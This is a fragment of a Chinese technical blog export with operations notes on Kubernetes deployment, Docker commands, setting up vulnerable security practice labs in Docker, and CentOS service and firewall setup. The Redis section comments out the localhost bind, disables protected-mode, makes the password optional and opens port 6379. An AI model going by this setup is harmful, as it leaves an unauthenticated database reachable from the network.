<h4 id="第二步：编写-Deployment-配置文件"><a href="#第二步：编写-Deployment-配置文件" class="headerlink" title="第二步：编写 Deployment 配置文件"></a>第二步：编写 Deployment 配置文件</h4><p>当我们的应用成功被打包成 Docker 镜像后，下一步就是告诉 K8s 如何运行这个应用。这里需要用到 YAML 或 JSON 格式的配置文件。我们先来看一个典型的 Deployment 配置示例：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">my-java-deployment</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">my-java-app</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">my-java-app</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">my-java-container</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">my-java-app:latest</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure>
<p>这段配置文件告诉 K8s 我们希望运行三个副本（replicas）的 Java 应用实例，并且这些实例会监听 8080 端口。selector 字段用于匹配 Pod 的标签，而 template 部分则描述了每个 Pod 的具体设置。</p>
<h4 id="第三步：应用配置并检查状态"><a href="#第三步：应用配置并检查状态" class="headerlink" title="第三步：应用配置并检查状态"></a>第三步：应用配置并检查状态</h4><p>现在，有了完整的配置文件后，就可以通过 kubectl apply 命令将其应用到集群中了：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl apply -f deployment.yaml</span><br></pre></td></tr></table></figure>
<p>接着，我们可以用以下命令来查看 Deployment 和相关的 Pods 是否正确创建：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl get deployments</span><br><span class="line">kubectl get pods</span><br></pre></td></tr></table></figure>
<p>如果你看到类似 my-java-deployment-xxx 的 Pods 名称出现，并且它们的状态都是 Running，那么恭喜你，你的 Java 应用已经在 K8s 上顺利部署啦！</p>
<h4 id="第四步：服务暴露与外部访问"><a href="#第四步：服务暴露与外部访问" class="headerlink" title="第四步：服务暴露与外部访问"></a>第四步：服务暴露与外部访问</h4><p>为了让外界能够访问我们的 Java 应用，还需要创建一个 Service 来暴露应用的服务。这里以 LoadBalancer 类型为例：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">my-java-service</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">LoadBalancer</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">my-java-app</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line">      <span class="attr">targetPort:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure>
<p>上述配置会创建一个外部可访问的服务，将请求转发给后端的 Java 应用实例。完成后再次应用配置：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl apply -f service.yaml</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>运维技术</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker笔记</title>
    <url>/cnblogs.github.io/2025/01/10/operations/docker/docker%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="Dokcer基本命令"><a href="#Dokcer基本命令" class="headerlink" title="Dokcer基本命令"></a>Dokcer基本命令</h3><h4 id="Docker常用命令"><a href="#Docker常用命令" class="headerlink" title="Docker常用命令"></a>Docker常用命令</h4><h5 id="镜像（Image）相关命令"><a href="#镜像（Image）相关命令" class="headerlink" title="镜像（Image）相关命令"></a>镜像（Image）相关命令</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker images                                                    # 查看本地所有镜像</span><br><span class="line">docker search &lt;镜像名&gt;                                            # 从 Docker Hub 搜索镜像（如 docker search nginx）</span><br><span class="line">docker pull &lt;镜像名:标签&gt;                                         #  拉取镜像（如 docker pull nginx:latest）</span><br><span class="line">docker rmi &lt;镜像ID或名称&gt;                                         # 删除本地镜像（-f 强制删除）</span><br><span class="line">docker build -t &lt;镜像名&gt; .                                        # 根据当前目录的 Dockerfile 构建镜像</span><br><span class="line">docker save -o &lt;文件名&gt;.tar &lt;镜像名&gt;                               # 将镜像保存为 .tar 文件（备份）</span><br><span class="line">docker load -i &lt;文件名&gt;.tar                                       # 从 .tar 文件加载镜像</span><br></pre></td></tr></table></figure>
<h5 id="容器（Container）相关命令"><a href="#容器（Container）相关命令" class="headerlink" title="容器（Container）相关命令"></a>容器（Container）相关命令</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker ps                                                       # 查看运行中的容器</span><br><span class="line">docker ps -a                                                    # 查看所有容器（包括已停止的）</span><br><span class="line">docker run -d -p &lt;主机端口&gt;:&lt;容器端口&gt; --name &lt;容器名&gt; &lt;镜像名&gt;    # 启动容器（-d 后台运行，-p 端口映射）</span><br><span class="line">docker start/stop/restart &lt;容器名或ID&gt;                          # 启动/停止/重启容器</span><br><span class="line">docker rm &lt;容器名或ID&gt;                                          # 删除已停止的容器（-f 强制删除运行中的容器）</span><br><span class="line">docker exec -it &lt;容器名或ID&gt; /bin/bash                          # 进入运行中的容器（交互式终端）</span><br><span class="line">docker logs &lt;容器名或ID&gt;                                        # 查看容器日志（-f 实时跟踪）</span><br></pre></td></tr></table></figure>
<h5 id="网络（Network）相关命令"><a href="#网络（Network）相关命令" class="headerlink" title="网络（Network）相关命令"></a>网络（Network）相关命令</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker network ls                                               # 查看所有网络</span><br><span class="line">docker network create &lt;网络名&gt;                                  # 创建自定义网络</span><br><span class="line">docker network inspect &lt;网络名&gt;                                 # 查看网络详情</span><br><span class="line">docker network connect &lt;网络名&gt; &lt;容器名&gt;                         # 将容器连接到指定网络</span><br></pre></td></tr></table></figure>
<h5 id="数据卷（Volume）相关命令"><a href="#数据卷（Volume）相关命令" class="headerlink" title="数据卷（Volume）相关命令"></a>数据卷（Volume）相关命令</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker volume ls                                                # 查看所有数据卷</span><br><span class="line">docker volume create &lt;卷名&gt;                                      # 创建数据卷</span><br><span class="line">docker volume inspect &lt;卷名&gt;                                     # 查看数据卷详情</span><br><span class="line">docker run -v &lt;主机路径&gt;:&lt;容器路径&gt; &lt;镜像名&gt;                       # 挂载主机目录到容器</span><br><span class="line">docker run -v &lt;卷名&gt;:&lt;容器路径&gt; &lt;镜像名&gt;                           # 使用数据卷挂载</span><br></pre></td></tr></table></figure>
<h5 id="清理与维护"><a href="#清理与维护" class="headerlink" title="清理与维护"></a>清理与维护</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker system df                                                # 查看 Docker 磁盘使用情况</span><br><span class="line">docker system prune                                             # 清理无用镜像、容器、网络（-a 包含未使用的镜像）</span><br><span class="line">docker container prune                                          # 删除所有已停止的容器</span><br><span class="line">docker image prune                                              # 删除未被使用的镜像</span><br></pre></td></tr></table></figure>

<h3 id="Dockerfile指令详解案例"><a href="#Dockerfile指令详解案例" class="headerlink" title="Dockerfile指令详解案例"></a>Dockerfile指令详解案例</h3><h4 id="类似if-else-条件表达式"><a href="#类似if-else-条件表达式" class="headerlink" title="类似if-else 条件表达式"></a>类似if-else 条件表达式</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Use an Ubuntu base image</span><br><span class="line">FROM ubuntu:20.04</span><br><span class="line"></span><br><span class="line"># Avoid prompts with apt</span><br><span class="line">ENV DEBIAN_FRONTEND=noninteractive</span><br><span class="line"></span><br><span class="line"># Declare an argument for the web server</span><br><span class="line">ARG WEBSERVER</span><br><span class="line"></span><br><span class="line"># Use shell logic to determine which server to install</span><br><span class="line">RUN if [ &quot;$WEBSERVER&quot; = &quot;nginx&quot; ]; then \</span><br><span class="line">        apt-get update &amp;&amp; apt-get install -y nginx; \</span><br><span class="line">    elif [ &quot;$WEBSERVER&quot; = &quot;apache&quot; ]; then \</span><br><span class="line">        apt-get update &amp;&amp; apt-get install -y apache2; \</span><br><span class="line">    else \</span><br><span class="line">        echo &quot;No valid webserver specified&quot;; \</span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line"># Rest of the Dockerfile... </span><br></pre></td></tr></table></figure>
<p>构建镜像并指定 web 服务器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker build --build-arg WEBSERVER=nginx -t myimage:latest .</span><br></pre></td></tr></table></figure>

<h3 id="Dokcer配置相关"><a href="#Dokcer配置相关" class="headerlink" title="Dokcer配置相关"></a>Dokcer配置相关</h3><h4 id="修改镜像源"><a href="#修改镜像源" class="headerlink" title="修改镜像源"></a>修改镜像源</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;registry-mirrors&quot;: [</span><br><span class="line">		&quot;https://docker.13140521.xyz&quot;,</span><br><span class="line">		&quot;https://docker.1panel.live&quot;</span><br><span class="line">	]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 重启docker 服务</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line"></span><br><span class="line"># 验证</span><br><span class="line">docker info</span><br></pre></td></tr></table></figure>

<h3 id="Dokcer相关工具"><a href="#Dokcer相关工具" class="headerlink" title="Dokcer相关工具"></a>Dokcer相关工具</h3><h4 id="单机版安装"><a href="#单机版安装" class="headerlink" title="单机版安装"></a>单机版安装</h4><h5 id="sqlserver"><a href="#sqlserver" class="headerlink" title="sqlserver"></a>sqlserver</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># sqlserver镜像拉取</span></span></span><br><span class="line">sudo docker pull mcr.microsoft.com/mssql/server:2022-latest</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 启动</span></span></span><br><span class="line">sudo docker run -e &quot;ACCEPT_EULA=Y&quot; -e &quot;MSSQL_SA_PASSWORD=&lt;Q1w2e3r4&gt;&quot; -p 1433:1433 --name sql_server -d mcr.microsoft.com/mssql/server:2022-latest</span><br></pre></td></tr></table></figure>
<h5 id="webgoat"><a href="#webgoat" class="headerlink" title="webgoat"></a>webgoat</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># webgoat镜像拉取</span></span></span><br><span class="line">sudo docker pull webgoat/webgoat-8.0</span><br><span class="line">sudo docker pull webgoat/webwolf</span><br><span class="line">sudo docker pull webgoat/goatandwolf</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 启动</span></span></span><br><span class="line">sudo docker run -dt --name webgoat -p 30007:8888 -p 30001:8080 -p 30008:9090 webgoat/goatandwolf</span><br></pre></td></tr></table></figure>
<h5 id="upload-lab"><a href="#upload-lab" class="headerlink" title="upload-lab"></a>upload-lab</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># upload-labs镜像拉取</span></span></span><br><span class="line">docker pull cuer/upload-labs</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 启动</span></span></span><br><span class="line">sudo docker run -dt --name upload-labs -p 30002:80 cuer/upload-labs</span><br></pre></td></tr></table></figure>
<h5 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># sqli-labs镜像拉取</span></span></span><br><span class="line">docker pull acgpiano/sqli-labs</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 启动</span></span></span><br><span class="line">sudo docker run -dt --name sqli-labs -p 30003:80 -p 13306:3306 acgpiano/sqli-labs</span><br></pre></td></tr></table></figure>
<h5 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># pikachu镜像拉取</span></span></span><br><span class="line">docker pull area39/pikachu</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 启动</span></span></span><br><span class="line">sudo docker run -dt --name pikachu -p 30004:80 area39/pikachu</span><br></pre></td></tr></table></figure>
<h5 id="dwa"><a href="#dwa" class="headerlink" title="dwa"></a>dwa</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># dvwa镜像拉取</span></span></span><br><span class="line">docker pull sagikazarmark/dvwa</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 启动</span></span></span><br><span class="line">sudo docker run -dt --name dvwa -p 30005:80 sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>
<h5 id="xss-challenge-tour"><a href="#xss-challenge-tour" class="headerlink" title="xss-challenge-tour"></a>xss-challenge-tour</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># xss-challenge-tour镜像拉取</span></span></span><br><span class="line">docker pull c0ny1/xss-challenge-tour </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 启动</span></span></span><br><span class="line">sudo docker run -dt --name xss -p 30006:80 c0ny1/xss-challenge-tour</span><br></pre></td></tr></table></figure>
<h5 id="Leanote"><a href="#Leanote" class="headerlink" title="Leanote"></a>Leanote</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker pull axboy/leanote</span><br><span class="line"></span><br><span class="line">sudo docker run -d -p 9800:9000 \</span><br><span class="line">    -e &quot;TZ=Asia/Shanghai&quot;\</span><br><span class="line">    -v /data/leanote/db:/data/db \</span><br><span class="line">    -v /data/leanote/conf/:/data/leanote/conf \</span><br><span class="line">    -v /data/leanote/files:/data/leanote/files \</span><br><span class="line">    -v /data/leanote/upload:/data/leanote/public/upload \</span><br><span class="line">    --name leanote \</span><br><span class="line">    axboy/leanote</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>运维技术</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS笔记</title>
    <url>/cnblogs.github.io/2025/01/10/operations/linux/CentOS%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="常规配置"><a href="#常规配置" class="headerlink" title="常规配置"></a>常规配置</h2><h3 id="更新YUM源"><a href="#更新YUM源" class="headerlink" title="更新YUM源"></a>更新YUM源</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -al /etc/yum.repos.d</span><br><span class="line">cp CentOS-Base.repo CentOS-Base.repo.backup</span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line">yum clean all</span><br><span class="line">yum makecache</span><br><span class="line">yum -y update</span><br></pre></td></tr></table></figure>
<h3 id="设置Java开机自动运行"><a href="#设置Java开机自动运行" class="headerlink" title="设置Java开机自动运行"></a>设置Java开机自动运行</h3><h4 id="方法一：使用systemd服务"><a href="#方法一：使用systemd服务" class="headerlink" title="方法一：使用systemd服务"></a>方法一：使用systemd服务</h4><p>systemd是Linux系统中广泛使用的初始化系统和系统管理守护进程，可以用来管理开机启动项</p>
<h5 id="创建一个服务文件"><a href="#创建一个服务文件" class="headerlink" title="创建一个服务文件"></a>创建一个服务文件</h5><p>创建一个新的service文件，例如ruoyi-admin.service，路径为&#x2F;etc&#x2F;systemd&#x2F;system&#x2F;：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nano /etc/systemd/system/ruoyi-admin.service</span><br></pre></td></tr></table></figure>
<h5 id="编辑服务文件"><a href="#编辑服务文件" class="headerlink" title="编辑服务文件"></a>编辑服务文件</h5><p>在文件中添加以下内容，根据实际情况修改：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=ruoyi-admin</span><br><span class="line">After=network.target</span><br><span class="line">[Service]</span><br><span class="line">User=root</span><br><span class="line">Group=root</span><br><span class="line">WorkingDirectory=/home/zhao/programs/ruoyi</span><br><span class="line">ExecStart=/usr/bin/java -jar /home/zhao/programs/ruoyi/ruoyi-admin.jar</span><br><span class="line">SuccessExitStatus=143</span><br><span class="line">Restart=on-failure</span><br><span class="line">RestartSec=10</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
<ul>
<li>Description：服务的描述。</li>
<li>After：指定该服务在</li>
<li>network.target之后启动。</li>
<li>User和Group：运行该服务的用户和组。</li>
<li>WorkingDirectory：工作目录。</li>
<li>ExecStart：启动Java程序的命令。</li>
<li>SuccessExitStatus：程序正常退出的状态码。</li>
<li>Restart：设置服务在失败后自动重启。</li>
<li>RestartSec：重启前的等待时间。</li>
</ul>
<h5 id="重新加载systemd配置并启动服务"><a href="#重新加载systemd配置并启动服务" class="headerlink" title="重新加载systemd配置并启动服务"></a>重新加载systemd配置并启动服务</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl start ruoyi-admin</span><br></pre></td></tr></table></figure>
<h5 id="设置开机自启"><a href="#设置开机自启" class="headerlink" title="设置开机自启"></a>设置开机自启</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl enable ruoyi-admin</span><br></pre></td></tr></table></figure>
<h5 id="检查服务状态"><a href="#检查服务状态" class="headerlink" title="检查服务状态"></a>检查服务状态</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl status ruoyi-admin</span><br></pre></td></tr></table></figure>

<h4 id="方法二：使用crontab"><a href="#方法二：使用crontab" class="headerlink" title="方法二：使用crontab"></a>方法二：使用crontab</h4><h5 id="编辑crontab文件"><a href="#编辑crontab文件" class="headerlink" title="编辑crontab文件"></a>编辑crontab文件</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure>
<h5 id="添加开机启动项"><a href="#添加开机启动项" class="headerlink" title="添加开机启动项"></a>添加开机启动项</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">@reboot /usr/bin/java -jar /home/zhao/programs/ruoyi/ruoyi-admin.jar</span><br></pre></td></tr></table></figure>
<ul>
<li>这里的@reboot表示在系统启动时执行该命令。</li>
<li>保存文件并退出编辑器，crontab会自动重新加载配置</li>
</ul>
<h4 id="方法三：使用rc-local"><a href="#方法三：使用rc-local" class="headerlink" title="方法三：使用rc.local"></a>方法三：使用rc.local</h4><h5 id="编辑rc-local文件"><a href="#编辑rc-local文件" class="headerlink" title="编辑rc.local文件"></a>编辑rc.local文件</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vi /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure>
<h5 id="添加启动命令"><a href="#添加启动命令" class="headerlink" title="添加启动命令"></a>添加启动命令</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/bin/java -jar /home/zhao/programs/ruoyi/ruoyi-admin.jar</span><br></pre></td></tr></table></figure>
<h5 id="赋予rc-local执行权限"><a href="#赋予rc-local执行权限" class="headerlink" title="赋予rc.local执行权限"></a>赋予rc.local执行权限</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chmod +x /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure>
<h5 id="启动rc-local服务"><a href="#启动rc-local服务" class="headerlink" title="启动rc.local服务"></a>启动rc.local服务</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl start rc.local</span><br></pre></td></tr></table></figure>
<h5 id="设置开机自启-1"><a href="#设置开机自启-1" class="headerlink" title="设置开机自启"></a>设置开机自启</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl enable rc.local</span><br></pre></td></tr></table></figure>


<h2 id="YUM命令【安装软件】"><a href="#YUM命令【安装软件】" class="headerlink" title="YUM命令【安装软件】"></a>YUM命令【安装软件】</h2><h3 id="Nginx1-22-1安装"><a href="#Nginx1-22-1安装" class="headerlink" title="Nginx1.22.1安装"></a>Nginx1.22.1安装</h3><h4 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://nginx.org/packages/centos/7/x86_64/RPMS/nginx-1.22.1-1.el7.ngx.x86_64.rpm</span><br></pre></td></tr></table></figure>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum localinstall nginx-1.22.1-1.el7.ngx.x86_64.rpm</span><br></pre></td></tr></table></figure>
<h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nginx -V</span><br><span class="line"></span><br><span class="line">/etc/nginx        #主目录</span><br><span class="line">/etc/nginx/nginx.conf   #配置文件</span><br><span class="line">/var/log/nginx    #日志</span><br><span class="line">/var/cache/nginx  #缓存</span><br><span class="line">/usr/sbin/nginx   #主程序</span><br><span class="line">/usr/lib64/nginx/modules  #组件模块</span><br></pre></td></tr></table></figure>
<h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl start nginx          # 启动服务</span><br><span class="line">sudo systemctl enable nginx         # 设置为开机自启</span><br><span class="line">sudo systemctl status nginx         # 检查 服务状态</span><br></pre></td></tr></table></figure>

<h3 id="Redis5-0安装"><a href="#Redis5-0安装" class="headerlink" title="Redis5.0安装"></a>Redis5.0安装</h3><h4 id="下载地址-1"><a href="#下载地址-1" class="headerlink" title="下载地址"></a>下载地址</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://rpmfind.net/linux/remi/enterprise/9/modular/x86_64/redis-5.0.14-1.el9.remi.x86_64.rpm</span><br></pre></td></tr></table></figure>
<h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum localinstall redis-5.0.14-1.el7.remi.x86_64.rpm</span><br></pre></td></tr></table></figure>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo  nano /etc/redis.conf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">daemonized no 改为 daemonized <span class="built_in">yes</span> 以后台静默进程启动</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把 <span class="built_in">bind</span> 127.0.0.1 注释掉</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">protected-mode <span class="built_in">yes</span> 把<span class="built_in">yes</span>改为no</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果想要设置密码: requirepass 密码（可选）</span></span><br></pre></td></tr></table></figure>
<h4 id="启动-1"><a href="#启动-1" class="headerlink" title="启动"></a>启动</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启redis服务</span></span><br><span class="line">sudo systemctl restart redis.service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置redis服务为开机自启</span></span><br><span class="line">sudo systemctl enable redis.service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> 查看redis是否启动成功</span></span><br><span class="line">ps aux | grep redis</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查 Redis 服务状态</span></span><br><span class="line">sudo systemctl status redis</span><br></pre></td></tr></table></figure>
<h4 id="防护墙打开端口6379"><a href="#防护墙打开端口6379" class="headerlink" title="防护墙打开端口6379"></a>防护墙打开端口6379</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加端口到 firewalld</span></span><br><span class="line">sudo firewall-cmd --zone=public --add-port=6379/tcp --permanent</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新加载防火墙配置</span></span><br><span class="line">sudo firewall-cmd --reload</span><br></pre></td></tr></table></figure>
<h4 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli -h 127.0.0.1 -p 6379</span><br></pre></td></tr></table></figure>

<h3 id="SQL-Server安装"><a href="#SQL-Server安装" class="headerlink" title="SQL Server安装"></a>SQL Server安装</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 添加 Microsoft 的官方存储库：</span></span></span><br><span class="line">sudo curl -o /etc/yum.repos.d/mssql-server. repo https://packages.microsoft.com/config/rhel/7/mssql-server-2019.repo</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 安装 SQL Server：</span></span></span><br><span class="line">sudo yum install -y mssql-server</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 配置 SQL Server：</span></span></span><br><span class="line">sudo /opt/mssql/bin/mssql-conf setup</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 在配置过程中，你需要接受许可协议并设置 SA 用户的密码。</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 启动 SQL Server 服务：</span></span></span><br><span class="line">sudo systemctl start mssql-server</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 验证 SQL Server 服务是否正在运行：</span></span></span><br><span class="line">systemctl status mssql-server</span><br></pre></td></tr></table></figure>


<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="防火墙命令"><a href="#防火墙命令" class="headerlink" title="防火墙命令"></a>防火墙命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">管理防火墙启动、重启、状态、关闭</span></span><br><span class="line">systemctl start|restart|status|stop firewalld</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开机启动防火墙</span></span><br><span class="line">systemctl enable firewalld</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">禁用防火墙</span></span><br><span class="line">systemctl disable firewalld</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新加载防火墙规则</span></span><br><span class="line">systemctl reload firewalld</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前安装版本</span></span><br><span class="line">firewall-cmd --version</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看防火墙状态</span></span><br><span class="line">firewall-cmd --state</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出防火墙所有规则列表</span></span><br><span class="line">firewall-cmd --zone=public --list-all</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出允许通过防火墙端口列表</span></span><br><span class="line">firewall-cmd --zone=public --list-ports</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加临时放行端口，重启防火墙后时效</span></span><br><span class="line">firewall-cmd --zone=public --add-port=80/tcp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加永久放行端口，重启防火墙依旧有效</span></span><br><span class="line">firewall-cmd --zone=public --add-port=80/tcp --permanent</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加永久放行端口段，此例代表8080-8900之间的端口都会放行</span></span><br><span class="line">firewall-cmd --zone=public --add-port=8080-8900/tcp --permanent</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查询端口放行状态，如果存在则返回端口信息，否则不显示</span></span><br><span class="line">firewall-cmd --zone=public --query-port=80/tcp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">永久删除放行端口</span></span><br><span class="line">firewall-cmd --zone=public --remove-port=80/tcp --permanent</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新加载防火墙规则</span></span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>运维技术</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux笔记</title>
